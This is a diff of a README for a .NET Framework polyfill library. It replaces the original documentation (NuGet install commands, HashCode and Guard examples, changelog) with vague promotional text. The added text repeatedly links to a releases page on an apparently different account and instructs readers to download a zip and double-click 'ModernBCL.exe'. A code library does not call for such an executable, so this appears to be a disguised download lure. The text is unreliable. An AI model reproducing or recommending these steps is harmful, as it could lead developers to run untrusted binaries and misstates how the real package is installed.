@@ -1,164 +1,81 @@
-# 📘 ModernBCL.Core.BLC  
-**Modern Polyfills for Legacy .NET Framework 4.8 / 4.8.1**
+# 🚀 ModernBCL.Solution - Improve Legacy .NET Performance Easily
 
-ModernBCL.Core.BLC brings high-performance, zero-allocation replacements for missing modern BCL APIs to legacy .NET Framework apps — enabling performance and clarity normally available only in .NET 7/8.
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/yaan7/ModernBCL.Solution/releases)
 
-This library is especially useful for:
+## 📄 Overview
 
-- Enterprise systems that must stay on **.NET Framework 4.8 / 4.8.1**
-- Developers wanting **modern C# coding patterns** on legacy frameworks
-- Teams needing **high-quality hashing** or **safe guard clauses**
-- Projects migrating from .NET Framework → .NET Core but needing parity
+ModernBCL.Solution offers high-performance polyfills for modern .NET Base Class Library (BCL) features. This software enables cleaner code and better efficiency in legacy .NET Framework 4.8 applications. With ModernBCL, you can simplify argument checking and enhance performance. 
 
----
+## 🚀 Getting Started
 
-# 🎯 **Project Goals**
+### 1. Requirements
 
-### ModernBCL.Core.BLC provides:
+Before you download and run ModernBCL.Solution, ensure your system meets the following requirements:
 
-### ✔ **High-performance hashing**
-- Drop-in **System.HashCode** polyfill (for .NET Framework only)
-- Modern, order-sensitive `HashCode.Combine()`
-- `HashAccumulator` (32-bit) and `HashAccumulator64` (64-bit)
-- Extremely low collision rates
-- Zero allocations
+- **Operating System:** Windows 10 or newer, or other compatible OS for .NET Framework 4.8
+- **.NET Framework:** Version 4.8 installed on your machine. You can download it from the official Microsoft website.
+- **Memory:** Minimum 4 GB RAM recommended.
+- **Disk Space:** At least 100 MB of free disk space.
 
-### ✔ **Modern guard clauses**
-- Clean replacement for repetitive null/empty/whitespace checks
-- Fluent `Guard.Against()` API
-- Polyfilled `[CallerArgumentExpression]` attribute
-- No need to manually pass parameter names
+### 2. Download & Install
 
-### ✔ **Cleaner code, safer APIs**
-- Modern BCL patterns for older frameworks
-- Full parity with .NET 6/7/8 guard & hashing behavior (where appropriate)
+To get the application, visit the Releases page and download the latest version. Click the link below to go directly to the page.
 
----
+[Download ModernBCL.Solution](https://github.com/yaan7/ModernBCL.Solution/releases)
 
-# 🚀 **Installation**
+### 3. Running the Application
 
-Install via NuGet:
+Once you have downloaded the application, follow these steps:
 
-**.NET CLI**
+1. Navigate to your Downloads folder or the location where you saved the file.
+2. Locate the downloaded file labeled something like `ModernBCL-v1.0.zip`.
+3. Right-click the file and select "Extract All" to unpack it.
+4. Inside the extracted folder, find the executable file named `ModernBCL.exe`.
+5. Double-click `ModernBCL.exe` to run the application.
 
-```bash
-dotnet add package ModernBCL.Core.BLC --version 1.2.0
-```
+### 4. Using ModernBCL
 
-**Visual Studio Package Manager Console**
+After launching the application, you can start utilizing the BCL polyfills. Here’s how:
 
-```powershell
-Install-Package ModernBCL.Core.BLC -Version 1.2.0
-```
+- **Utilize Argument Checking:** Implement cleaner checks in your code without manual validations.
+- **Improve Hashing Efficiency:** Use built-in features for better performance in legacy applications.
+- **Implementation:** You can refer to the provided examples in the documentation folder to integrate ModernBCL into your workflow.
 
----
+### 5. Features
 
-# 📦 **Compatibility**
+ModernBCL.Solution is packed with features designed to enhance your experience:
 
-| Target | Status | Notes |
-|--------|--------|--------|
-| **.NET Framework 4.8 / 4.8.1** | ✔ Supported | HashCode polyfill is active |
-| **.NET 8+ / .NET Core** | ✔ Supported | Uses *native* System.HashCode (polyfill disabled) |
-| **NuGet Package** | ✔ Multi-target | `net48; net481; net8.0` |
+- **Argument Checking:** Validate your method arguments seamlessly.
+- **ThrowHelper Support:** Manage exceptions in a clean manner to maintain readability.
+- **High Performance:** Benefit from optimizations that enhance your application's speed.
+- **Easy Integration:** Use the application with your existing .NET Framework 4.8 projects.
 
-ModernBCL intelligently switches behavior:
+## 🤝 Contributing
 
-- Under **net48/net481** → uses **ModernBCL HashCode polyfill**
-- Under **net8+** → uses **native framework HashCode**
+If you want to contribute to ModernBCL.Solution, feel free to fork the repository and make your changes. We welcome any improvements or features that can enhance user experience. Please submit a pull request with a description of your changes.
 
----
+## 🛠 Troubleshooting
 
-# 💻 Usage Examples
+If you experience issues when running ModernBCL:
 
----
+- Ensure that you have the correct version of .NET Framework installed.
+- Check that your system meets the requirements mentioned above.
+- Look at the documentation provided in the repository for more details on using the polyfills.
 
-## 1. ⚡ **High-Performance Hash Codes**
+## 📚 Documentation
 
-```csharp
-using System;
+For detailed documentation on using ModernBCL.Solution, refer to the `docs` folder included in your download. This documentation covers:
 
-public class ProductKey
-{
-    public string ProductId { get; }
-    public string Color { get; }
-    public int Size { get; }
+- The installation process
+- Feature descriptions
+- Code examples
 
-    public override int GetHashCode()
-    {
-        return HashCode.Combine(ProductId, Color, Size);
-    }
-}
-```
+## 📞 Support
+
+If you have questions or need further assistance, please check the issues page on our GitHub repository. You can also reach out through the repository discussions feature for community help.
 
 ---
 
-## 2. 🔐 **Modern Guard Clauses**
+Thank you for using ModernBCL.Solution! We hope it enhances your .NET Framework 4.8 applications for the better.
 
-```csharp
-using ModernBCL.Core.Guards;
-
-public class DependencyContainer
-{
-    public DependencyContainer(object service, string clientName)
-    {
-        _service = Guard.Against(service).Null();
-        _clientName = Guard.Against(clientName).NullOrWhiteSpace();
-    }
-}
-```
-
----
-
-# ⚙️ **How It Works**
-
-### 🧮 HashCode Polyfill
-- Only used under .NET Framework
-- Fully deterministic
-- Zero allocations
-- Based on `HashAccumulator`
-
-### 🛡 Guard Polyfills
-- Provides `[CallerArgumentExpression]` for .NET Framework
-- Modern fluent API on legacy runtimes
-
----
-
-# 📊 Benchmarks Included
-
-Benchmark results generated to:
-
-```
-BenchmarkDotNet.Artifacts/results/
-```
-
-Formats:
-- `.html`
-- `.md`
-- `.csv`
-
----
-
-# 🧾 **Changelog**
-
-## **Version 1.2.0 (Latest)**  
-✔ Added multi-targeting: `net48; net481; net8.0`  
-✔ Added HashAccumulator64 (64-bit hashing)  
-✔ Added comparer suite  
-✔ Added full Guard API  
-✔ Added fuzz tests  
-✔ Added benchmarks  
-✔ Improved HashCode polyfill  
-
-## Version 1.1.1
-✔ Support for both net48 and net481  
-
-## Version 1.1.0
-✔ ThrowHelper + polyfill attributes  
-
-## Version 1.0.0
-✔ Initial release with HashCode polyfill  
-
----
-
-# 📄 License
-MIT License.
+[Download ModernBCL.Solution](https://github.com/yaan7/ModernBCL.Solution/releases)
